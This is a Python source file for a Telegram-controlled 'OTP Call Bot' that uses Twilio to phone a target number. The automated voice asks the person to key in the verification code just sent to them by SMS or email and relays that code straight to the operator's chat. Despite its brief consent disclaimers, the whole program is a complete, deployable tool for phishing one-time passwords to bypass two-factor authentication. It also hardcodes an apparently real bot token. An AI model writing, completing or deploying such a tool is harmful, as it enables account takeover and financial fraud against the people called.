import os
import logging
import sqlite3
import json
from datetime import datetime
from threading import Thread
from cryptography.fernet import Fernet

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from flask import Flask, request, Response
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather

# ============================
# CONFIGURATION
# ============================
# HARDCODED VALUES
TELEGRAM_BOT_TOKEN = "7793179311:AAEcPTzRlwFxg3lDPLrt6UktqfDsq8-K2Mk"
PORT = 5000
WEBHOOK_BASE_URL = "https://web-production-25142.up.railway.app"  # YOUR RAILWAY URL

# AUTO-GENERATE ENCRYPTION KEY
def get_encryption_key():
    """Generate or load encryption key"""
    key_file = 'encryption.key'
    
    # Try to load existing key
    if os.path.exists(key_file):
        try:
            with open(key_file, 'rb') as f:
                key = f.read()
                # Validate it's a proper Fernet key
                Fernet(key)
                logger.info("✅ Loaded existing encryption key")
                return key
        except Exception as e:
            logger.warning(f"Invalid key file, generating new: {e}")
    
    # Generate new key
    logger.info("🔑 Generating new encryption key...")
    key = Fernet.generate_key()
    
    # Save for future use
    try:
        with open(key_file, 'wb') as f:
            f.write(key)
        logger.info("✅ Encryption key saved to file")
    except Exception as e:
        logger.warning(f"Could not save key file: {e}")
    
    return key

# ============================
# Setup logging
# ============================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Initialize encryption
ENCRYPTION_KEY = get_encryption_key()
cipher = Fernet(ENCRYPTION_KEY)

def encrypt_data(data):
    """Encrypt sensitive data"""
    if data:
        return cipher.encrypt(data.encode()).decode()
    return None

def decrypt_data(data):
    """Decrypt sensitive data"""
    if data:
        return cipher.decrypt(data.encode()).decode()
    return None

# ============================
# Flask webhook server
# ============================
flask_app = Flask(__name__)
active_calls = {}

@flask_app.route('/')
def home():
    return "✅ OTP Call Bot is running!"

@flask_app.route('/twilio/voice', methods=['GET', 'POST'])
def handle_twilio_voice():
    """Handle incoming call from Twilio"""
    call_sid = request.values.get('CallSid', '')
    logger.info(f"Twilio voice webhook called for: {call_sid}")
    
    if call_sid not in active_calls:
        logger.warning(f"Unknown call SID: {call_sid}")
        resp = VoiceResponse()
        resp.say("Call session not found. Goodbye.")
        resp.hangup()
        return Response(str(resp), mimetype='text/xml')
    
    call_data = active_calls[call_sid]
    otp_type = call_data.get('otp_type', 'verification')
    
    resp = VoiceResponse()
    
    # Greeting message
    if otp_type == 'sms':
        message = "Hello. Please enter the 6-digit verification code you received via SMS, followed by the pound key."
    else:
        message = "Hello. Please enter the 6-digit verification code you received via email, followed by the pound key."
    
    resp.say(message, voice='alice', language='en-US')
    
    # Gather digits
    gather = Gather(
        input='dtmf',
        timeout=20,
        numDigits=6,
        finishOnKey='#',
        action=f'{WEBHOOK_BASE_URL}/twilio/gather/{call_sid}',
        method='POST'
    )
    resp.append(gather)
    
    # If no input
    resp.say("We didn't receive any input. Goodbye.")
    resp.hangup()
    
    return Response(str(resp), mimetype='text/xml')

@flask_app.route('/twilio/gather/<call_sid>', methods=['POST'])
def handle_gather(call_sid):
    """Handle OTP digits from caller"""
    digits = request.values.get('Digits', '')
    logger.info(f"Received digits for call {call_sid}: {digits}")
    
    if call_sid not in active_calls:
        resp = VoiceResponse()
        resp.say("Session expired. Goodbye.")
        resp.hangup()
        return Response(str(resp), mimetype='text/xml')
    
    call_data = active_calls[call_sid]
    
    # Save OTP to database
    try:
        conn = sqlite3.connect('otp_bot.db')
        cursor = conn.cursor()
        
        # Update call log with OTP
        cursor.execute('''
            UPDATE call_logs 
            SET otp_received = ?, status = 'completed', completed_at = CURRENT_TIMESTAMP
            WHERE call_sid = ?
        ''', (digits, call_sid))
        
        # Get Telegram chat ID
        cursor.execute('SELECT telegram_chat_id FROM call_logs WHERE call_sid = ?', (call_sid,))
        result = cursor.fetchone()
        
        if result:
            call_data['otp'] = digits
            call_data['status'] = 'completed'
            call_data['telegram_chat_id'] = result[0]
            logger.info(f"✅ OTP saved for call {call_sid}")
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        logger.error(f"Error saving OTP: {e}")
    
    # End the call
    resp = VoiceResponse()
    resp.say("Thank you. Verification complete. Goodbye.")
    resp.hangup()
    
    return Response(str(resp), mimetype='text/xml')

@flask_app.route('/twilio/status', methods=['POST'])
def handle_status():
    """Handle call status updates"""
    call_sid = request.values.get('CallSid')
    call_status = request.values.get('CallStatus')
    
    logger.info(f"Call {call_sid} status: {call_status}")
    
    if call_sid in active_calls:
        if call_status in ['completed', 'failed', 'busy', 'no-answer', 'canceled']:
            try:
                conn = sqlite3.connect('otp_bot.db')
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE call_logs 
                    SET status = ?
                    WHERE call_sid = ?
                ''', (call_status, call_sid))
                conn.commit()
                conn.close()
                
                # Clean up
                if call_sid in active_calls:
                    del active_calls[call_sid]
                    
            except Exception as e:
                logger.error(f"Error updating call status: {e}")
    
    return '', 200

@flask_app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

def run_flask():
    """Run Flask server"""
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ============================
# Database setup
# ============================
def init_database():
    conn = sqlite3.connect('otp_bot.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER UNIQUE,
            account_sid TEXT,
            auth_token TEXT,
            twilio_phone TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_active INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS call_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            telegram_chat_id INTEGER,
            target_number TEXT,
            call_sid TEXT UNIQUE,
            otp_type TEXT,
            status TEXT,
            otp_received TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (id)
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("✅ Database initialized")

# Initialize database
init_database()

# ============================
# Twilio Manager
# ============================
class TwilioManager:
    def __init__(self):
        self.telegram_bot = None
    
    def set_bot(self, bot):
        self.telegram_bot = bot
    
    async def make_call(self, user_id, target_number, otp_type, chat_id):
        """Make real Twilio call"""
        try:
            # Get user's Twilio credentials
            conn = sqlite3.connect('otp_bot.db')
            cursor = conn.cursor()
            cursor.execute('''
                SELECT account_sid, auth_token, twilio_phone 
                FROM users WHERE id = ? AND is_active = 1
            ''', (user_id,))
            user = cursor.fetchone()
            
            if not user:
                conn.close()
                return None, "❌ Account not active or not found"
            
            account_sid = decrypt_data(user[0])
            auth_token = decrypt_data(user[1])
            from_number = user[2]
            
            # Initialize Twilio client
            client = Client(account_sid, auth_token)
            
            # Create the call
            call = client.calls.create(
                url=f"{WEBHOOK_BASE_URL}/twilio/voice",
                to=target_number,
                from_=from_number,
                timeout=30,
                status_callback=f"{WEBHOOK_BASE_URL}/twilio/status",
                status_callback_event=['initiated', 'ringing', 'answered', 'completed'],
                status_callback_method='POST'
            )
            
            # Store in database
            cursor.execute('''
                INSERT INTO call_logs 
                (user_id, telegram_chat_id, target_number, call_sid, otp_type, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user_id, chat_id, target_number, call.sid, otp_type, 'initiated'))
            
            conn.commit()
            conn.close()
            
            # Store in active calls
            active_calls[call.sid] = {
                'user_id': user_id,
                'telegram_chat_id': chat_id,
                'target': target_number,
                'otp_type': otp_type,
                'status': 'initiated'
            }
            
            logger.info(f"✅ Call initiated: {call.sid} to {target_number}")
            return call.sid, None
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"❌ Twilio call error: {error_msg}")
            
            if 'Authentication Error' in error_msg:
                return None, "❌ Invalid Twilio credentials"
            elif 'not authorized to call' in error_msg:
                return None, "❌ Number not authorized"
            elif 'insufficient funds' in error_msg.lower():
                return None, "❌ Insufficient funds"
            else:
                return None, f"❌ Error: {error_msg[:100]}"
    
    async def send_otp_notification(self, chat_id, call_sid, otp, target_number, otp_type):
        """Send OTP to Telegram user"""
        try:
            message = (
                f"🎉 *OTP RECEIVED!*\n\n"
                f"✅ **Call Successful**\n"
                f"📱 **Target:** `{target_number}`\n"
                f"📋 **Type:** {otp_type.upper()}\n"
                f"🔢 **OTP Code:** `{otp}`\n"
                f"🆔 **Call ID:** `{call_sid}`\n"
                f"⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}\n\n"
                f"⚠️ *For authorized use only!*"
            )
            
            if self.telegram_bot:
                await self.telegram_bot.bot.send_message(
                    chat_id=chat_id,
                    text=message,
                    parse_mode='Markdown'
                )
                return True
        except Exception as e:
            logger.error(f"Error sending OTP notification: {e}")
        return False

# Initialize Twilio manager
twilio_manager = TwilioManager()

# ============================
# Conversation states
# ============================
(
    MAIN_MENU, SETUP_ACCOUNT_SID, SETUP_AUTH_TOKEN, SETUP_PHONE,
    ENTER_TARGET, SELECT_OTP_TYPE, CONFIRM_CALL
) = range(7)

# ============================
# Telegram Bot Handlers
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    await update.message.reply_text(
        f"🤖 *OTP Call Bot*\n\n"
        f"🔗 **Webhook URL:** `{WEBHOOK_BASE_URL}`\n"
        f"🔑 **Encryption:** Active\n\n"
        f"*Setup your Twilio account to begin:*",
        parse_mode='Markdown'
    )
    
    # Check if user exists
    conn = sqlite3.connect('otp_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE telegram_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    
    if user:
        await show_main_menu(update, context)
        return MAIN_MENU
    else:
        await ask_for_account_sid(update, context)
        return SETUP_ACCOUNT_SID

async def ask_for_account_sid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask for Twilio Account SID"""
    await update.message.reply_text(
        "🔧 *Step 1/3: Account SID*\n\n"
        "Enter your **Twilio Account SID**:\n\n"
        "Format: `ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`\n\n"
        "Type /cancel to abort.",
        parse_mode='Markdown'
    )

async def setup_account_sid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive Account SID"""
    account_sid = update.message.text.strip()
    
    if account_sid.startswith('/'):
        return await cancel(update, context)
    
    if len(account_sid) < 30 or not account_sid.startswith('AC'):
        await update.message.reply_text(
            "❌ Invalid Account SID.\n"
            "It should start with 'AC' and be 32 chars.\n"
            "Try again:"
        )
        return SETUP_ACCOUNT_SID
    
    context.user_data['account_sid'] = account_sid
    await update.message.reply_text(
        "✅ Account SID saved!\n\n"
        "🔧 *Step 2/3: Auth Token*\n\n"
        "Enter your **Twilio Auth Token**:\n\n"
        "Keep this secret!",
        parse_mode='Markdown'
    )
    return SETUP_AUTH_TOKEN

async def setup_auth_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive Auth Token"""
    auth_token = update.message.text.strip()
    
    if auth_token.startswith('/'):
        return await cancel(update, context)
    
    if len(auth_token) < 30:
        await update.message.reply_text(
            "❌ Auth Token too short.\n"
            "Should be 32 characters.\n"
            "Try again:"
        )
        return SETUP_AUTH_TOKEN
    
    context.user_data['auth_token'] = auth_token
    await update.message.reply_text(
        "✅ Auth Token saved!\n\n"
        "🔧 *Step 3/3: Phone Number*\n\n"
        "Enter your **Twilio Phone Number**:\n\n"
        "Format: `+1234567890`\n"
        "Must have voice calling enabled.",
        parse_mode='Markdown'
    )
    return SETUP_PHONE

async def setup_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive Twilio phone number"""
    phone = update.message.text.strip()
    
    if phone.startswith('/'):
        return await cancel(update, context)
    
    if not phone.startswith('+') or len(phone) < 11:
        await update.message.reply_text(
            "❌ Invalid format.\n"
            "Use: `+1234567890` (with country code)\n"
            "Try again:"
        )
        return SETUP_PHONE
    
    user_id = update.effective_user.id
    
    # Test credentials before saving
    try:
        client = Client(context.user_data['account_sid'], context.user_data['auth_token'])
        # Try to get account info to verify
        account = client.api.accounts(context.user_data['account_sid']).fetch()
        
        # Save to database
        conn = sqlite3.connect('otp_bot.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO users 
            (telegram_id, account_sid, auth_token, twilio_phone, is_active)
            VALUES (?, ?, ?, ?, 1)
        ''', (
            user_id,
            encrypt_data(context.user_data['account_sid']),
            encrypt_data(context.user_data['auth_token']),
            phone
        ))
        
        conn.commit()
        conn.close()
        
        await update.message.reply_text(
            f"🎉 *Setup Complete!*\n\n"
            f"✅ Credentials verified\n"
            f"✅ Phone number: `{phone}`\n"
            f"✅ Account: `{account.friendly_name or 'Twilio Account'}`\n\n"
            f"*Next:* Use the menu to make a call!",
            parse_mode='Markdown'
        )
        
        context.user_data.clear()
        await show_main_menu(update, context)
        return MAIN_MENU
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ *Credential Test Failed*\n\n"
            f"Error: {str(e)}\n\n"
            f"Please check your credentials and try again.\n"
            f"Enter Account SID:"
        )
        return SETUP_ACCOUNT_SID

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show main menu"""
    keyboard = [
        [InlineKeyboardButton("📞 Make OTP Call", callback_data='make_call')],
        [InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')],
        [InlineKeyboardButton("📊 Call History", callback_data='view_history')],
        [InlineKeyboardButton("🔧 Update Credentials", callback_data='update_creds')],
        [InlineKeyboardButton("ℹ️ Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            "📱 *Main Menu*\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "📱 *Main Menu*\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def make_call_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle make call request"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    # Check if user has active setup
    conn = sqlite3.connect('otp_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT is_active FROM users WHERE telegram_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    
    if not user or user[0] != 1:
        await query.edit_message_text(
            "❌ *Setup Required*\n\n"
            "You need to set up Twilio first.\n"
            "Use /start to begin.",
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    await query.edit_message_text(
        "📞 *Make OTP Call*\n\n"
        "Enter the **target phone number**:\n\n"
        "Format: `+1234567890`\n"
        "Example: +19195551234\n\n"
        "Type /cancel to go back.",
        parse_mode='Markdown'
    )
    return ENTER_TARGET

async def enter_target_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive target number"""
    target = update.message.text.strip()
    
    if target.startswith('/'):
        return await cancel(update, context)
    
    if not target.startswith('+') or len(target) < 11:
        await update.message.reply_text(
            "❌ Invalid format.\n"
            "Use: `+1234567890` (with country code)\n"
            "Enter target number:",
            parse_mode='Markdown'
        )
        return ENTER_TARGET
    
    context.user_data['target_number'] = target
    
    # Ask for OTP type
    keyboard = [
        [InlineKeyboardButton("📱 SMS OTP", callback_data='type_sms')],
        [InlineKeyboardButton("📧 Email OTP", callback_data='type_email')],
        [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ Target: `{target}`\n\n"
        "Select **OTP type** to request:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return SELECT_OTP_TYPE

async def select_otp_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle OTP type selection"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'type_sms':
        otp_type = 'sms'
        type_text = "SMS"
    else:
        otp_type = 'email'
        type_text = "Email"
    
    context.user_data['otp_type'] = otp_type
    target = context.user_data['target_number']
    
    # Show confirmation
    keyboard = [
        [InlineKeyboardButton("✅ Start Call ($0.0135/min)", callback_data='start_call')],
        [InlineKeyboardButton("🔙 Cancel", callback_data='back_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📞 *Confirm Call*\n\n"
        f"**Target:** `{target}`\n"
        f"**OTP Type:** {type_text}\n"
        f"**Cost:** ~$0.0135/minute\n"
        f"**Webhook:** `{WEBHOOK_BASE_URL}`\n\n"
        f"⚠️ *Requirements:*\n"
        f"• You must have permission to call\n"
        f"• Sufficient Twilio balance\n"
        f"• Target must answer phone\n\n"
        f"Click *Start Call* to proceed:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return CONFIRM_CALL

async def start_real_call(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start real Twilio call"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    target = context.user_data['target_number']
    otp_type = context.user_data['otp_type']
    
    # Get user's database ID
    conn = sqlite3.connect('otp_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT id FROM users WHERE telegram_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    
    if not user:
        await query.edit_message_text("❌ User not found. Please setup again.")
        return await show_main_menu(update, context)
    
    db_user_id = user[0]
    
    # Show initiating message
    await query.edit_message_text(
        f"📞 *Initiating Call...*\n\n"
        f"**Target:** `{target}`\n"
        f"**Status:** Connecting to Twilio...\n\n"
        f"⏳ Please wait (10-30 seconds)...",
        parse_mode='Markdown'
    )
    
    # Make the actual Twilio call
    call_sid, error = await twilio_manager.make_call(db_user_id, target, otp_type, chat_id)
    
    if error:
        await query.edit_message_text(
            f"❌ *Call Failed*\n\n"
            f"**Error:** {error}\n\n"
            f"**Solutions:**\n"
            f"1. Check balance\n"
            f"2. Verify credentials\n"
            f"3. Ensure number is verified",
            parse_mode='Markdown'
        )
    else:
        await query.edit_message_text(
            f"✅ *Call Initiated!*\n\n"
            f"**Target:** `{target}`\n"
            f"**Status:** Ringing...\n"
            f"**Call ID:** `{call_sid}`\n"
            f"**Type:** {otp_type.upper()} OTP\n\n"
            f"⏳ *Waiting for OTP...*\n\n"
            f"*What happens next:*\n"
            f"1. Target answers call\n"
            f"2. Hears: \"Please enter 6-digit code...\"\n"
            f"3. Enters OTP via keypad\n"
            f"4. OTP appears here automatically\n\n"
            f"⏰ Call times out in 30 seconds",
            parse_mode='Markdown'
        )
        
        # Start monitoring for OTP
        await monitor_call_for_otp(update, context, call_sid, target, otp_type)
    
    context.user_data.clear()
    return MAIN_MENU

async def monitor_call_for_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, call_sid, target, otp_type):
    """Monitor call for OTP completion"""
    chat_id = update.effective_chat.id
    
    import asyncio
    max_wait = 60  # 60 seconds max
    check_interval = 2  # Check every 2 seconds
    
    for i in range(max_wait // check_interval):
        await asyncio.sleep(check_interval)
        
        # Check if OTP received in active_calls
        if call_sid in active_calls and 'otp' in active_calls[call_sid]:
            otp = active_calls[call_sid]['otp']
            
            # Send OTP to user
            await twilio_manager.send_otp_notification(
                chat_id, call_sid, otp, target, otp_type
            )
            
            # Clean up
            if call_sid in active_calls:
                del active_calls[call_sid]
            break
        
        # Check database
        conn = sqlite3.connect('otp_bot.db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT otp_received FROM call_logs WHERE call_sid = ? AND status = "completed"',
            (call_sid,)
        )
        result = cursor.fetchone()
        conn.close()
        
        if result and result[0]:
            otp = result[0]
            await twilio_manager.send_otp_notification(
                chat_id, call_sid, otp, target, otp_type
            )
            break

async def check_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check Twilio account balance"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    # Get user's database ID
    conn = sqlite3.connect('otp_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT id FROM users WHERE telegram_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    
    if not user:
        await query.edit_message_text("❌ User not found. Setup with /start")
        return MAIN_MENU
    
    db_user_id = user[0]
    
    # Get user's credentials
    conn = sqlite3.connect('otp_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT account_sid, auth_token FROM users WHERE id = ?', (db_user_id,))
    user_data = cursor.fetchone()
    conn.close()
    
    if not user_data:
        await query.edit_message_text("❌ Credentials not found")
        return MAIN_MENU
    
    account_sid = decrypt_data(user_data[0])
    auth_token = decrypt_data(user_data[1])
    
    try:
        # Get balance from Twilio
        client = Client(account_sid, auth_token)
        balance = client.api.v2010.accounts(account_sid).balance.fetch()
        
        await query.edit_message_text(
            f"💰 *Twilio Account Balance*\n\n"
            f"**Balance:** ${float(balance.balance):.2f} {balance.currency}\n"
            f"**Account:** {account_sid[:8]}...\n\n"
            f"📞 *Call Costs:*\n"
            f"• Outbound calls: $0.0135/min\n"
            f"• 1-minute call: ~$0.02\n"
            f"• Phone number: ~$1-2/month\n\n"
            f"⚡ Ensure sufficient balance!",
            parse_mode='Markdown'
        )
    except Exception as e:
        await query.edit_message_text(
            f"❌ *Balance Check Failed*\n\n"
            f"Error: {str(e)}\n\n"
            f"Check credentials with /start",
            parse_mode='Markdown'
        )
    
    return MAIN_MENU

async def view_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View call history"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    conn = sqlite3.connect('otp_bot.db')
    cursor = conn.cursor()
    
    # Get user's database ID
    cursor.execute('SELECT id FROM users WHERE telegram_id = ?', (user_id,))
    user = cursor.fetchone()
    
    if not user:
        await query.edit_message_text("❌ No history found.")
        return MAIN_MENU
    
    db_user_id = user[0]
    
    # Get last 5 calls
    cursor.execute('''
        SELECT target_number, otp_type, status, otp_received, created_at
        FROM call_logs 
        WHERE user_id = ? 
        ORDER BY created_at DESC 
        LIMIT 5
    ''', (db_user_id,))
    
    calls = cursor.fetchall()
    conn.close()
    
    if calls:
        history_text = f"📊 *Call History*\n\n"
        
        for call in calls:
            target, otp_type, status, otp, timestamp = call
            status_icon = "✅" if status == 'completed' else "❌" if status == 'failed' else "📞"
            otp_text = f"OTP: `{otp}`" if otp else "No OTP"
            time_str = timestamp.split()[1][:5] if ' ' in str(timestamp) else str(timestamp)[11:16]
            
            history_text += (
                f"{status_icon} *{time_str}*\n"
                f"To: `{target}`\n"
                f"Type: {otp_type.upper()} | Status: {status}\n"
                f"{otp_text}\n\n"
            )
    else:
        history_text = "No calls yet. Make your first call!"
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        history_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help"""
    query = update.callback_query
    await query.answer()
    
    help_text = f"""
    🤖 *OTP Call Bot - Railway Edition*

    *How it works:*
    1. Setup Twilio credentials (one-time)
    2. Enter target phone number
    3. Select SMS or Email OTP
    4. Bot makes REAL Twilio call
    5. Target enters OTP via phone keypad
    6. OTP appears here instantly

    *Webhook URL:* `{WEBHOOK_BASE_URL}`

    *Commands:*
    /start - Setup or main menu
    /call - Make new OTP call
    /balance - Check Twilio balance
    /history - View call history
    /help - This message

    *Twilio Setup:*
    1. Sign up at twilio.com
    2. Get Account SID & Auth Token
    3. Buy phone number ($1-2/month)
    4. Add funds ($20 recommended)

    *Costs (Twilio):*
    • Outbound calls: $0.0135/minute
    • Phone number: ~$1-2/month
    • 1-minute call: ~$0.02

    *⚠️ Important:*
    • ALWAYS get consent before calling
    • Use only for legitimate purposes
    • You pay for all calls
    """
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        help_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel operation"""
    if update.message:
        await update.message.reply_text("Operation cancelled.")
    else:
        await update.callback_query.message.reply_text("Operation cancelled.")
    
    context.user_data.clear()
    await show_main_menu(update, context)
    return MAIN_MENU

# ============================
# Main bot setup
# ============================
def main():
    """Start the bot"""
    print("=" * 60)
    print("🚀 OTP CALL BOT - Railway Edition")
    print("=" * 60)
    print(f"Bot Token: {TELEGRAM_BOT_TOKEN[:15]}...")
    print(f"Webhook URL: {WEBHOOK_BASE_URL}")
    print(f"Port: {PORT}")
    print("=" * 60)
    print("🔑 Encryption key auto-generated")
    print("✅ Database initialized")
    print("=" * 60)
    
    # Start Flask server in background thread
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("✅ Flask server started")
    
    # Create Telegram bot
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Set bot reference in Twilio manager
    twilio_manager.set_bot(application)
    
    # Setup conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            MAIN_MENU: [
                CallbackQueryHandler(make_call_handler, pattern='^make_call$'),
                CallbackQueryHandler(check_balance, pattern='^check_balance$'),
                CallbackQueryHandler(view_history, pattern='^view_history$'),
                CallbackQueryHandler(ask_for_account_sid, pattern='^update_creds$'),
                CallbackQueryHandler(help_command, pattern='^help$'),
                CallbackQueryHandler(show_main_menu, pattern='^back_main$'),
            ],
            SETUP_ACCOUNT_SID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, setup_account_sid)
            ],
            SETUP_AUTH_TOKEN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, setup_auth_token)
            ],
            SETUP_PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, setup_phone)
            ],
            ENTER_TARGET: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, enter_target_number)
            ],
            SELECT_OTP_TYPE: [
                CallbackQueryHandler(select_otp_type, pattern='^type_'),
                CallbackQueryHandler(show_main_menu, pattern='^back_main$'),
            ],
            CONFIRM_CALL: [
                CallbackQueryHandler(start_real_call, pattern='^start_call$'),
                CallbackQueryHandler(show_main_menu, pattern='^back_main$'),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    application.add_handler(conv_handler)
    
    # Add direct command handlers
    application.add_handler(CommandHandler('call', make_call_handler))
    application.add_handler(CommandHandler('balance', check_balance))
    application.add_handler(CommandHandler('history', view_history))
    application.add_handler(CommandHandler('help', help_command))
    
    print("\n✅ Bot is running...")
    print("📞 Commands: /start, /call, /balance, /history, /help")
    print("🌐 Webhook URL:", WEBHOOK_BASE_URL)
    print("=" * 60)
    
    # Run the bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
